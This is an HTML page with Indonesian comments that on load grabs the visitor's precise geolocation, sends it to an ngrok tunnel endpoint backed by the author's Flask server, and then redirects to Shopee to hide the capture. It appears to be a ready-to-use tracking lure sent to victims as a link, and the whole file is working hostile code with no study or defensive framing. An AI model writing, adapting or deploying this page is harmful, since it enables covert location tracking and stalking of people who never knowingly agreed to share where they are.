<!DOCTYPE html>
<html>
<head>
    <title>Mengirim lokasi...</title>
</head>
<body>
<script>
    window.onload = function() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    let latitude = pos.coords.latitude;
                    let longitude = pos.coords.longitude;

                   fetch("https://7fa57a1566dc.ngrok-free.app/lokasi", {  // Ganti IP dengan server Flask Anda
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({ lat: latitude, lon: longitude })
                    })
                    .then(() => {
                        // Setelah sukses kirim â†’ langsung redirect ke Shopee
                        window.location.href = "https://shopee.co.id";
                    })
                    .catch(() => {
                        // Kalau gagal kirim juga tetap redirect
                        window.location.href = "https://shopee.co.id";
                    });
                },
                function() {
                    // Kalau gagal ambil lokasi, tetap redirect
                    window.location.href = "https://shopee.co.id";
                },
                { enableHighAccuracy: true }
            );
        } else {
            window.location.href = "https://shopee.co.id";
        }
    };
</script>
</body>
</html>
